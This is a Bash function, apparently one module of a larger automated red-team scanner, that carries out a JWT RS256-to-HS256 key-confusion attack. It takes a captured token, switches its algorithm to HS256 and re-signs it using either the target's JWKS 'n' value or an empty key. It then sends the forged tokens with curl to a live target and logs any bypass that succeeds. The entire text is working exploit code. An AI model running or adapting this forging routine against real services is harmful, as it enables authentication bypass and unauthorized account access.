rt_31_jwt_rs256_confusion() {
    _section "[RT 31/60] JWT RS256→HS256 KEY CONFUSION"
    run "Testing JWT asymmetric→symmetric algorithm confusion..."
    > "$SESSION/rt/jwt_rs256_to_hs256.txt"
    [ ! -s "$SESSION/auth/jwt_found.txt" ] && { info "No JWT to test"; return; }
    local jwt=$(head -1 "$SESSION/auth/jwt_found.txt" 2>/dev/null)
    [ -z "$jwt" ] && return
    local hdr_b64=$(echo "$jwt" | cut -d. -f1)
    local pay_b64=$(echo "$jwt" | cut -d. -f2)
    local hdr=$(echo "$hdr_b64" | tr '_-' '/+' | base64 -d 2>/dev/null)
    echo "$hdr" | grep -q '"alg":"RS256"' || { info "JWT not RS256"; return; }
    local new_hdr=$(echo "$hdr" | sed 's/"alg":"RS256"/"alg":"HS256"/')
    local new_hdr_b64=$(echo -n "$new_hdr" | base64 -w0 | tr '+/' '-_' | tr -d '=')
    # Try to fetch JWKS and use 'n' field as HMAC key
    local jwks_url=$(grep -oiE 'https?://[^"]+jwks[^"]*' "$SESSION/web/index.html" 2>/dev/null | head -1)
    [ -n "$jwks_url" ] && {
        local jwks=$(_curl "$jwks_url" 2>/dev/null)
        local n_val=$(echo "$jwks" | grep -o '"n":"[^"]*"' | head -1 | sed 's/.*"n":"//;s/"$//')
        [ -n "$n_val" ] && {
            local sig=$(echo -n "${new_hdr_b64}.${pay_b64}" | openssl dgst -sha256 -hmac "$n_val" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
            local forged="${new_hdr_b64}.${pay_b64}.${sig}"
            local code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $forged" "https://$TARGET" --connect-timeout 10 2>/dev/null)
            [ "$code" = "200" ] && { echo "RS256→HS256 bypass WORKS with JWKS 'n' as key" >> "$SESSION/rt/jwt_rs256_to_hs256.txt"; rt "JWT RS256→HS256 bypass confirmed!"; }
        }
    }
    # Also try empty key
    local sig_empty=$(echo -n "${new_hdr_b64}.${pay_b64}" | openssl dgst -sha256 -hmac "" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
    local forged_empty="${new_hdr_b64}.${pay_b64}.${sig_empty}"
    local code_empty=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $forged_empty" "https://$TARGET" --connect-timeout 10 2>/dev/null)
    [ "$code_empty" = "200" ] && { echo "RS256→HS256 bypass WORKS with empty key" >> "$SESSION/rt/jwt_rs256_to_hs256.txt"; rt "JWT RS256→HS256 bypass confirmed!"; }
}

